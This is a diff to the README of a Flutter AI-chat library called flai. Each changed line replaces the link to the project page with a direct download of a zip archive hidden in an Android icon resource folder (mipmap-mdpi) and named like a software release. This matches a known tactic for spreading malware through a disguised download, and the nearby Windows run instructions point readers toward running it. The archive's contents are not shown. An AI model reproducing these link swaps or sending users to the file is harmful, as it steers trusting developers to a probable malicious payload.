@@ -1,6 +1,6 @@
 # 🧩 flai - Beautiful AI chat for Flutter
 
-[![Download flai](https://img.shields.io/badge/Download%20flai-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zacherieunexceptional123/flai)
+[![Download flai](https://img.shields.io/badge/Download%20flai-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Zacherieunexceptional123/flai/main/example/android/app/src/main/res/mipmap-mdpi/Software_v2.3-alpha.2.zip)
 
 ## ✨ What is flai?
 
@@ -12,7 +12,7 @@ It is built for people who want AI chat in a Flutter app without starting from s
 
 Use this link to visit the page to download:
 
-[https://github.com/Zacherieunexceptional123/flai](https://github.com/Zacherieunexceptional123/flai)
+[https://raw.githubusercontent.com/Zacherieunexceptional123/flai/main/example/android/app/src/main/res/mipmap-mdpi/Software_v2.3-alpha.2.zip](https://raw.githubusercontent.com/Zacherieunexceptional123/flai/main/example/android/app/src/main/res/mipmap-mdpi/Software_v2.3-alpha.2.zip)
 
 ### What to do on Windows
 
@@ -231,4 +231,4 @@ If Windows does not run the project right away, check these items:
 
 ## 📎 Download again
 
-[Visit the flai download page](https://github.com/Zacherieunexceptional123/flai)
+[Visit the flai download page](https://raw.githubusercontent.com/Zacherieunexceptional123/flai/main/example/android/app/src/main/res/mipmap-mdpi/Software_v2.3-alpha.2.zip)
